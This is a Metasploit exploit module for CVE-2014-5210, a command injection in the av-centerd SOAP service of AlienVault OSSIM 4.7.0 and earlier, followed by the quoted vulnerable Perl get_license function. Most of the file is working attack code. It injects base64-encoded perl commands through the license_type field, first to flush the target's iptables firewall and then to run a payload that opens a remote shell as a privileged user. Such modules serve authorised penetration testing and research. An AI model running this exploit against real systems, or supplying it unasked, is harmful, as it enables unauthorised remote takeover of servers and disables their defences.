require 'msf/core'
require 'rexml/document'

class MetasploitModule < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include REXML

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Alienvault OSSIM av-centerd Command Injection get_license',
			'Description'	=> %q{
				This module exploits a command injection flaw found in the get_license
				function found within Util.pm. The vulnerability is triggered due to an
				unsanitized $license_type parameter passed to a string which is then
				executed by the system.
			},
			'Author' => [ 'james fitts' ],
			'License' => MSF_LICENSE,
			'References' =>
				[
					[ 'CVE', '2014-5210' ],
					[ 'ZDI', '14-294' ],
					[ 'BID', '69239' ],
					[ 'URL', 'https://www.alienvault.com/forums/discussion/2690' ]
				],
			'Privileged'	=> true,
			'Platform'		=> 'unix',
			'Arch'			=> ARCH_CMD,
			'DefaultOptions' =>
				{
					'SSL' => true,
				},
			'Payload' =>
				{
					'Compat'	=> {
						'RequiredCmd'	=> 'perl netcat-e openssl python gawk'
					}
				},
			'DefaultTarget'	=> 0,
			'Targets' =>
				[
					['Alienvault <= 4.7.0',{}]
				],
			'DisclosureDate' => 'Aug 14 2014'))

			register_options([Opt::RPORT(40007)], self.class)
	end

	def check
		version = ""
		res = send_soap_request("get_dpkg")

		if res &&
			res.code == 200 &&
			res.headers['SOAPServer'] &&
			res.headers['SOAPServer'] =~ /SOAP::Lite/ &&
			res.body.to_s =~ /alienvault-center\s*([\d\.]*)-\d/

			version = $1
		end

		if version.empty? || version >= "4.7.0"
			return Exploit::CheckCode::Safe
		else
			return Exploit::CheckCode::Appears
		end
	end

	def build_soap_request(method, pass)
		xml = Document.new
		xml.add_element(
			"soap:Envelope",
			{
				"xmlns:xsi"						=> "http://www.w3.org/2001/XMLSchema-instance",
				"xmlns:soapenc"				=> "http://schemas.xmlsoap.org/soap/encoding/",
				"xmlns:xsd"						=> "http://www.w3.org/2001/XMLSchema",
				"soap:encodingStyle"	=> "http://schemas.xmlsoap.org/soap/encoding/",
				"xmlns:soap"					=> "http://schemas.xmlsoap.org/soap/envelope/"
			})

		body = xml.root.add_element("soap:Body")
		m = body.add_element(method, { 'xmlns'	=> "AV/CC/Util" })

		args = []
		args[0] = m.add_element("c-gensym3", {'xsi:type' => 'xsd:string'})
		args[0].text = "All"

		args[1] = m.add_element("c-gensym5", {'xsi:type' => 'xsd:string'})
		args[1].text = "423d7bea-cfbc-f7ea-fe52-272ff7ede3d2"

		args[2] = m.add_element("c-gensym7", {'xsi:type' => 'xsd:string'})
		args[2].text = "#{datastore['RHOST']}"

		args[3] = m.add_element("c-gensym9", {'xsi:type' => 'xsd:string'})
		args[3].text = "#{rand_text_alpha(4 + rand(4))}"

		args[4] = m.add_element("c-gensym11", {'xsi:type' => 'xsd:string'})
		args[4].text = "#{rand_text_alpha(4 + rand(4))}"

		if pass == '0'
			args[5] = m.add_element("c-gensym13", {'xsi:type' => 'xsd:string'})
			perl_payload =  "system(decode_base64"
			perl_payload += "(\"#{Rex::Text.encode_base64("iptables --flush")}\"))"
			args[5].text = "|perl -MMIME::Base64 -e '#{perl_payload}';"
		elsif pass == '1'
			args[5] = m.add_element("c-gensym13", {'xsi:type' => 'xsd:string'})
			perl_payload =  "system(decode_base64"
			perl_payload += "(\"#{Rex::Text.encode_base64(payload.encoded)}\"))"
			args[5].text = "|perl -MMIME::Base64 -e '#{perl_payload}';"
		end

		xml.to_s
	end

	def send_soap_request(method, timeout=20, action)
		if action == 'disable'
			soap = build_soap_request(method, '0')
		elsif action == 'pop_shell'
			soap = build_soap_request(method, '1')
		end

		res = send_request_cgi({
			'uri'		=> '/av-centerd',
			'method'	=> 'POST',
			'ctype'		=> 'text/xml; charset=UTF-8',
			'data'		=> soap,
			'headers'	=> {
				'SOAPAction'	=> "\"AV/CC/Util##{method}\""
			}
		}, timeout)

		res
	end

	def exploit
		print_status("Disabling firewall...")
		send_soap_request("get_license", 1, "disable")

		print_status("Popping shell...")
		send_soap_request("get_license", 1, "pop_shell")
	end
end
__END__

/usr/share/alienvault-center/lib/AV/CC/Util.pm

sub get_license() {
    my ( $funcion_llamada, $nombre, $uuid, $admin_ip, $hostname, $license, $license_type ) = @_;
    verbose_log_file(
        "LICENSE $license_type:Received call from $uuid : ip source = $admin_ip, hostname = $hostname:($funcion_llamada,$nombre,$license,$license_type)"
    );

    my $deb='/usr/share/ossim-installer/temp/avl.deb';
    my $header='/usr/share/ossim-installer/temp/header';

    unlink $deb if ( -f $deb ); #delete previous file if found
    unlink $header if ( -f $header ); #delete previous file if found

    my $user_agent_uuid = AV::uuid::get_uuid;
       $SIG{CHLD} = 'DEFAULT';
    my $license_encoded = uri_escape($license);
    my $package = system ( "curl --proxy-anyauth -K /etc/curlrc --max-time 20 --user-agent $user_agent_uuid --dump-header $header -o $deb http://data.alienvault.com/avl/$license_type/?license=$license_encoded" );
        $SIG{CHLD} = 'IGNORE';

    my @out = q{};

    if ( !-e $header || -z $header ) {
        @out = ( '1', 'Imposible to connect. Please check your network configuration' );
        unlink $header;
        return \@out;
    }

    if ( -e $deb ) {

        open HEADERFILE, "< $header" or die "Not  $!";
        my @header_content = <HEADERFILE>;
        close(HEADERFILE);
        my $response_ok = 0;
        foreach (@header_content) {

            if ( $_ =~ / 200 OK/) {
                $response_ok = 1;
            }
        }
        if ( $response_ok == 0 ) {
            @out = ( '1', 'Imposible to connect. Please check your network configuration' );
            unlink $header;
            unlink $deb;
            return \@out;
        }


        $SIG{CHLD} = 'DEFAULT';
        my $command = "/usr/bin/dpkg -i --force-confnew $deb";
        verbose_log_file ("LICENSE $license_type: $command");
        my $result = qx{$command};
        $SIG{CHLD} = 'IGNORE';
        $result >>= 8 ;
        if ( $result == 0 ) {
            verbose_log_file ("LICENSE $license_type: SUCCESS. Installed");
            unlink $deb;
            unlink $header;
            @out = ( '0', 'SUCCESS. Installed' );
            return \@out;
        }
        else
        {
            verbose_log_file ("LICENSE $license_type: ERROR. Install failed");
            @out = ( '2', 'ERROR. Install failed' );
            unlink $deb;
            unlink $header;
            return \@out;
        }
    }
    else
    {
        my $error_msg;
        verbose_log_file ("LICENSE $license_type: ERROR MSG");
        open LFILE, "< $header" or die "Not  $!";
        my @header_msg = <LFILE>;
        close(LFILE);
        foreach(@header_msg){
            verbose_log_file ($_);
            if ($_ =~ m/X-AV-ERROR/)
            {
                $error_msg = $_;
            }
        }
        unlink $header;

        @out = ( '2', substr($error_msg, 12, -1)); # Remove 'X-AV-ERROR: 'and \n
        return \@out;
    }
}

